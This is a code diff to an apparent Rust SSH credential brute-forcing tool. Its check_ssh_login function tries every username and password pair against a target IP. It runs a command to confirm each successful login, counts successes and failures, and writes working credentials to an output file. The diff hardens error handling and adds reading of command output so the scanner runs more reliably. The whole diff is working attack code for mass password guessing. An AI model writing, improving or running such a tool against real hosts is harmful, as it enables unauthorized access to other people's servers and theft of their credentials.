@@ -9,6 +9,7 @@ use std::time::Duration;
 use std::sync::atomic::{AtomicUsize, Ordering};
 use colored::*; 
 use clap::Parser;
+use std::io::Read;
 
 static IMPORTED: AtomicUsize = AtomicUsize::new(0);
 static CHECKED: AtomicUsize = AtomicUsize::new(0);
@@ -105,49 +106,68 @@ fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, ou
     CHECKED.fetch_add(1, Ordering::Relaxed);
 
     let tcp_stream_result = net::TcpStream::connect((ip.as_str(), port));
-    
+
     match tcp_stream_result {
         Ok(tcp_stream) => {
-            let mut session = Session::new().unwrap();
+            let mut session = match Session::new() {
+                Ok(session) => session,
+                Err(_) => {
+                    FAILED.fetch_add(1, Ordering::Relaxed);
+                    return;
+                }
+            };
+
             session.set_tcp_stream(tcp_stream);
             session.set_timeout(timeout);
 
-            match session.handshake() {
-                Ok(_) => {
-                    for (username, password) in &credentials {
-                        COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
+            if session.handshake().is_err() {
+                FAILED.fetch_add(1, Ordering::Relaxed);
+                return;
+            }
 
-                        match session.userauth_password(username, password) {
-                            Ok(_) => {
-                                // Execute a harmless command to verify the authentication
-                                let mut channel = session.channel_session().unwrap();
-                                if let Err(_) = channel.exec("echo 'Connection Verified'") {
-                                    FAILED.fetch_add(1, Ordering::Relaxed);
-                                    continue;
-                                }
-                                channel.wait_close().unwrap();
+            for (username, password) in &credentials {
+                COMBOS_CHECKED.fetch_add(1, Ordering::Relaxed);
 
-                                if channel.exit_status().unwrap() == 0 {
-                                    session.disconnect(None, "Closing session", None).unwrap();
-                                    write_successful_login_to_file(output_file, &ip, username, password);
-                                    SUCCESS.fetch_add(1, Ordering::Relaxed);
-                                    break;
-                                } else {
-                                    FAILED.fetch_add(1, Ordering::Relaxed);
-                                }
-                            },
-                            Err(_) => {
-                                FAILED.fetch_add(1, Ordering::Relaxed);
-                            }
+                if session.userauth_password(username, password).is_ok() {
+                    let mut channel = match session.channel_session() {
+                        Ok(channel) => channel,
+                        Err(_) => {
+                            FAILED.fetch_add(1, Ordering::Relaxed);
+                            continue;
                         }
+                    };
+
+                    if channel.exec("echo '.'").is_err() {
+                        FAILED.fetch_add(1, Ordering::Relaxed);
+                        continue;
                     }
-                },
-                Err(e) => {
-                    if e.to_string().contains("timeout") {
-                        TIMEOUTS.fetch_add(1, Ordering::Relaxed);
+
+                    // Read any potential output from the command
+                    let mut output = String::new();
+                    if let Err(e) = channel.read_to_string(&mut output) {
+                        //println!! ("Error reading output for IP {} with username {}: {}", ip, username, e);
+                    }
+
+                    // Send EOF if needed
+                    channel.send_eof().unwrap_or_default();
+
+                    // Now, try to close the channel
+                    if let Err(e) = channel.wait_close() {
+                        //println!! ("Channel close error for IP {} with username {}: {}", ip, username, e);
+                        FAILED.fetch_add(1, Ordering::Relaxed);
+                        continue;
+                    }
+
+                    if channel.exit_status().unwrap_or(-1) == 0 {
+                        session.disconnect(None, "Closing session", None).unwrap_or_default();
+                        write_successful_login_to_file(output_file, &ip, username, password);
+                        SUCCESS.fetch_add(1, Ordering::Relaxed);
+                        break;
                     } else {
                         FAILED.fetch_add(1, Ordering::Relaxed);
                     }
+                } else {
+                    FAILED.fetch_add(1, Ordering::Relaxed);
                 }
             }
         },
@@ -160,6 +180,8 @@ fn check_ssh_login(ip: String, port: u16, credentials: Vec<(String, String)>, ou
         }
     }
 }
+
+
 
 fn load_credentials_file(file_path: &str) -> Vec<(String, String)> {
     let file = std::fs::File::open(file_path).expect("Unable to open credentials file");
